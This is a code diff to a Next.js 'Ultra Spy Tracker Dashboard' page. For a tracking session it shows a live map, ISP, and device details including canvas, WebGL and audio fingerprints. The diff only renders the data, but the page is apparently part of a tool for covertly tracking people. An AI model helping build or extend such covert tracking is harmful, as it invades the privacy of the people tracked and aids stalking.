@@ -1,11 +1,12 @@
 /**
  * ██████████████████████████████████████████████████████████████
- * TRACKER PAGE – LIVE SESSION VIEW (v4.1 – FIXED & OPTIMIZED)
+ * TRACKER PAGE – LIVE SESSION VIEW (v5.1 – ULTRA SPY GRADE)
  * 
- * ✅ Fixed: Property 'org' does not exist on type 'IPInfo'
- * ✅ Fully integrated with ALL your previous files
- * ✅ Shows full device details, hardware, GPU, screen, etc.
+ * ✅ Fully updated for deviceDetector.ts v5.1
+ * ✅ Shows ALL spy-grade data: fingerprints, HDR, GPU, system prefs, PWA, etc.
+ * ✅ Beautiful, organized, modern dashboard
  * ✅ Perfect Mobile SIM vs WiFi ISP logic
+ * ✅ No TypeScript errors
  * ██████████████████████████████████████████████████████████████
  */
 
@@ -18,9 +19,7 @@ import { ref, onValue } from "firebase/database";
 import dynamic from "next/dynamic";
 import { DeviceInfo } from "@/lib/deviceDetector";
 
-const LiveMap = dynamic(() => import("@/components/LiveMap"), {
-  ssr: false,
-});
+const LiveMap = dynamic(() => import("@/components/LiveMap"), { ssr: false });
 
 /* ---------------- TYPES ---------------- */
 
@@ -130,7 +129,7 @@ export default function TrackPage() {
 
   /* ---------------- HELPERS ---------------- */
   const ipInfo = network?.ipInfo ?? null;
-  const displayIsp = network?.isp || ipInfo?.isp || "Detecting...";   // ← FIXED HERE
+  const displayIsp = network?.isp || ipInfo?.isp || "Detecting...";
 
   const getStrength = () => {
     if (status !== "online") return 0;
@@ -237,14 +236,15 @@ export default function TrackPage() {
 
       {/* RIGHT PANEL – FULL DASHBOARD */}
       <div style={styles.rightPanel}>
-        <h2>🔥 Live Tracker Dashboard</h2>
+        <h2>🕵️‍♂️ Ultra Spy Tracker Dashboard</h2>
         <p style={{ opacity: 0.6, marginBottom: 24 }}>Session ID: <strong>{id}</strong></p>
 
-        {/* 1. DEVICE INFO (FULL POWER) */}
+        {/* 1. DEVICE INFO – MAXIMUM DETAIL */}
         <div style={styles.cardRight}>
-          <h3>📱 Device Info</h3>
+          <h3>📱 Device Info (Spy Grade)</h3>
           {device ? (
             <div style={styles.grid}>
+              {/* Basic */}
               <div>
                 <strong>Brand / Model</strong>
                 <p style={{ fontSize: 19, fontWeight: 700 }}>
@@ -253,7 +253,7 @@ export default function TrackPage() {
               </div>
               <div>
                 <strong>OS</strong>
-                <p>{device.os} {device.osVersion}</p>
+                <p>{device.os} {device.osVersion || ""}</p>
               </div>
               <div>
                 <strong>Browser</strong>
@@ -264,14 +264,15 @@ export default function TrackPage() {
                 <p>{device.type}</p>
               </div>
 
-              {(device.cpuCores || device.ramGB) && (
-                <div style={styles.subSection}>
-                  <strong>Hardware</strong>
-                  <p>CPU Cores: {device.cpuCores || "—"}</p>
-                  <p>RAM: {device.ramGB ? `${device.ramGB} GB` : "—"}</p>
-                </div>
-              )}
+              {/* Hardware */}
+              <div style={styles.subSection}>
+                <strong>Hardware</strong>
+                <p>CPU Cores: {device.cpuCores || "—"}</p>
+                <p>RAM: {device.ramGB ? `${device.ramGB} GB` : "—"}</p>
+                {device.cpuModelHint && <p>CPU: {device.cpuModelHint}</p>}
+              </div>
 
+              {/* GPU */}
               {(device.webGLVendor || device.webGLRenderer) && (
                 <div style={styles.subSection}>
                   <strong>GPU (WebGL)</strong>
@@ -282,23 +283,44 @@ export default function TrackPage() {
                 </div>
               )}
 
+              {/* Display */}
               <div style={styles.subSection}>
-                <strong>Screen</strong>
+                <strong>Display</strong>
                 <p>
                   {device.screenWidth} × {device.screenHeight} • {device.pixelRatio}x
                 </p>
+                <p>Avail: {device.availWidth} × {device.availHeight}</p>
                 <p>Orientation: {device.orientation}</p>
-                <p>Touch points: {device.touchPoints}</p>
+                <p>Color Gamut: {device.colorGamut} {device.isHDR ? "(HDR)" : ""}</p>
               </div>
 
+              {/* Touch & Mobile */}
               <div style={styles.subSection}>
-                <strong>System</strong>
+                <strong>Input</strong>
+                <p>Touch Points: {device.touchPoints}</p>
+                <p>Touch Device: {device.isTouchDevice ? "Yes" : "No"}</p>
+                <p>Standalone / PWA: {device.isStandalone ? "Yes" : "No"}</p>
+                <p>Mobile App Mode: {device.isMobileApp ? "Yes" : "No"}</p>
+              </div>
+
+              {/* System Preferences */}
+              <div style={styles.subSection}>
+                <strong>System Preferences</strong>
                 <p>Language: {device.language}</p>
+                <p>Languages: {device.languages?.join(", ")}</p>
                 <p>Timezone: {device.timezone}</p>
                 <p>Dark Mode: {device.darkMode ? "Enabled" : "Disabled"}</p>
-                {device.highEntropyAvailable && (
-                  <p style={{ color: "#22c55e", fontSize: 13 }}>✅ High-Entropy UA available</p>
-                )}
+                <p>Reduced Motion: {device.prefersReducedMotion ? "Yes" : "No"}</p>
+                <p>Reduced Data: {device.prefersReducedData ? "Yes" : "No"}</p>
+                <p>High Contrast: {device.prefersContrast}</p>
+              </div>
+
+              {/* Fingerprints (Ultra Spy) */}
+              <div style={styles.subSection}>
+                <strong>🔑 Fingerprints</strong>
+                {device.canvasFingerprint && <p>Canvas: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.canvasFingerprint}</span></p>}
+                {device.webglFingerprint && <p>WebGL: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.webglFingerprint}</span></p>}
+                {device.audioFingerprint && <p>Audio: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.audioFingerprint}</span></p>}
               </div>
             </div>
           ) : (
